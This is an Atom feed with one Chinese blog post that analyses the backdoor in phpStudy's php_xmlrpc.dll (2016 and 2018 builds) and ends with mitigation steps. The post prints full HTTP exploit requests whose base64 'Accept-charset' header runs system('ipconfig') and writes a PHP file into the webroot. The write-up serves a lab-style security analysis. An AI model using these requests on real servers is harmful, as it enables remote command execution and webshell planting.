<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tao&#39;s blog</title>
  
  
  <link href="http://bobtaoy.github.io/atom.xml" rel="self"/>
  
  <link href="http://bobtaoy.github.io/"/>
  <updated>2020-09-26T06:45:30.181Z</updated>
  <id>http://bobtaoy.github.io/</id>
  
  <author>
    <name>Bobtaoy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpstudy后门分析</title>
    <link href="http://bobtaoy.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://bobtaoy.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</id>
    <published>2020-09-26T05:52:36.000Z</published>
    <updated>2020-09-26T06:45:30.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><blockquote><p>有问题的版本：</p><p>​    默认路劲    C:\phpStudy\PHPTutorial\php\php-5.2.17\ext\</p></blockquote><table><thead><tr><th>PHPStudy</th><th>php版本</th><th>ext扩展文件夹下</th></tr></thead><tbody><tr><td>phpStudy20180211</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr><tr><td>phpStudy20161103</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr></tbody></table><p>后门所在位置：</p><p><img src="image-20191104165448398.png" alt="image-20191104165448398"></p><p>使用记事本打开 <code>php_xmlrpc.dll</code>文件</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>我们通过burp抓包软件来利用后门</p><p>没有修改的请求头信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="image-20191104170224539.png" alt="image-20191104170224539"></p><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate #deflate前面的空格去掉</span><br><span class="line">Accept-charset:c3lzdGVtKCdpcGNvbmZpZycpOw&#x3D;&#x3D; # 添加新字段，值需要base64编码</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行系统命令：<code>c3lzdGVtKCdpcGNvbmZpZycpOw==</code></p><p>解码为：<code>system(&#39;ipconfig&#39;);</code></p><p><img src="image-20191104170721857.png" alt="image-20191104170721857"></p><p>phpinfo</p><p><img src="image-20191104170830577.png" alt="image-20191104170830577"></p><p>写一句话木马,利用 file_put_contents()函数</p><p><code>file_put_contents(&quot;C:\phpStudy\PHPTutorial\WWW\info.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</code></p><p><img src="image-20191104171240547.png" alt="image-20191104171240547"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset:ZmlsZV9wdXRfY29udGVudHMoIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xpbmZvLnBocCIsIjw&#x2F;cGhwIHBocGluZm8oKTsgPz4iKTs&#x3D;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="image-20191104171403855.png" alt="image-20191104171403855"></p><h2 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h2><p>1.修改<code>php.ini</code>配置文件，注释这个扩展文件</p><p><img src="image-20191104171619733.png" alt="image-20191104171619733"></p><ol start="2"><li>使用最新的phpstudy</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题概述&quot;&gt;&lt;a href=&quot;#问题概述&quot; class=&quot;headerlink&quot; title=&quot;问题概述&quot;&gt;&lt;/a&gt;问题概述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;有问题的版本：&lt;/p&gt;
&lt;p&gt;​    默认路劲    C:\phpStudy\PHPTutori</summary>
      
    
    
    
    <category term="PHP" scheme="http://bobtaoy.github.io/categories/PHP/"/>
    
    
    <category term="php安全" scheme="http://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
    
    <category term="phpstudy后门分析" scheme="http://bobtaoy.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
